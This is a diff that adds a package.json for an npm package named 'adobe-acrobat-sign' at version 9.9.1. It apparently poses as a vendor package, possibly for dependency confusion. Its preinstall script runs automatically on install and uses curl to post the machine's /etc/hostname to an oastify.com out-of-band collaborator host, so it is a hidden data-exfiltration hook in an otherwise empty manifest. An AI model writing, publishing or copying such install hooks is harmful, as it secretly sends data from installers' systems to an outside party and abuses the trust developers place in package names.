@@ -1,0 +1,12 @@
+{
+  "name": "adobe-acrobat-sign",
+  "version": "9.9.1",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "/usr/bin/curl --data '@/etc/hostname' $(hostname)gvf0i6zoi2es23tbzwsrjs2q8hed23qs.oastify.com"
+  },
+  "author": "",
+  "license": "ISC"
+}
